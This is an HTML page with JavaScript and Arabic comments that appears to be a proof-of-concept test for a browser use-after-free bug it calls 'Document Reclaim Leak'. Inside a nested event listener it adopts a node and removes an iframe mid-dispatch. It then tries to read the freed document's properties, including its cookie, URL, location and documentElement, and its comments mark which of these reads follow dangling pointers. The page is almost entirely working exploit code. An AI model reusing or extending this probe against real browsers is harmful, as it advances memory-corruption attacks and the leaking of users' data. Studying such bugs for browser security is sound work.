<!DOCTYPE html>
<html>
<body>
<button onclick="main()">اختبار: Document Reclaim Leak</button>
<pre id="log"></pre>
<script>
function log(m) { document.getElementById('log').textContent += m + '\n'; }

function main() {
    log('=== Document Reclaim Leak Test ===');

    const f = document.body.appendChild(document.createElement('iframe'));
    const a = document.createElement('div');
    const b = a.appendChild(document.createElement('div'));

    // Listener 1: حرر الـ Document
    a.addEventListener('a', function() {
        log('[1] تحرير Document...');
        document.adoptNode(a);
        f.remove();
        // لا نرمي spray — نترك الذاكرة كما هي
    });

    // Listener 2: buffer
    a.addEventListener('a', () => {});

    // Listener 3: اقرأ الخصائص قبل أن يُصفّر المرجع
    b.addEventListener('a', () => {
        log('[3] محاولة قراءة Document...');
        try {
            var doc = f.contentDocument;
            if (!doc) {
                log('[3] f.contentDocument = null');
                return;
            }
            log('[3] f.contentDocument موجود! قراءة الخصائص...');

            // خصائص آمنة (لا تتبع مؤشرات)
            try { log('  nodeType: ' + doc.nodeType); } catch(e) { log('  nodeType ERR: ' + e); }
            try { log('  readyState: ' + doc.readyState); } catch(e) { log('  readyState ERR: ' + e); }
            try { log('  visibilityState: ' + doc.visibilityState); } catch(e) { log('  visibilityState ERR: ' + e); }
            try { log('  compatMode: ' + doc.compatMode); } catch(e) { log('  compatMode ERR: ' + e); }

            // خصائص خطر (تتبع مؤشرات)
            try { log('  URL: ' + doc.URL); } catch(e) { log('  URL ERR: ' + e); }
            try { log('  referrer: ' + doc.referrer); } catch(e) { log('  referrer ERR: ' + e); }
            try { log('  title: ' + doc.title); } catch(e) { log('  title ERR: ' + e); }
            try { log('  cookie: ' + doc.cookie); } catch(e) { log('  cookie ERR: ' + e); }
            try { log('  domain: ' + doc.domain); } catch(e) { log('  domain ERR: ' + e); }
            try { log('  characterSet: ' + doc.characterSet); } catch(e) { log('  characterSet ERR: ' + e); }
            try { log('  contentType: ' + doc.contentType); } catch(e) { log('  contentType ERR: ' + e); }

            // خصائص كائن (تتبع مؤشرات)
            try {
                var loc = doc.location;
                if (loc) log('  location.href: ' + loc.href);
                else log('  location: null');
            } catch(e) { log('  location ERR: ' + e); }

            try {
                var elem = doc.documentElement;
                if (elem) log('  documentElement: ' + elem.tagName);
                else log('  documentElement: null');
            } catch(e) { log('  documentElement ERR: ' + e); }

        } catch(e) {
            log('[3] CRASH أو خطأ: ' + e);
        }
    });

    log('إرسال الحدث...');
    b.dispatchEvent(new Event('a', { bubbles: true }));
    log('=== انتهى ===');
}
</script>
</body>
</html>
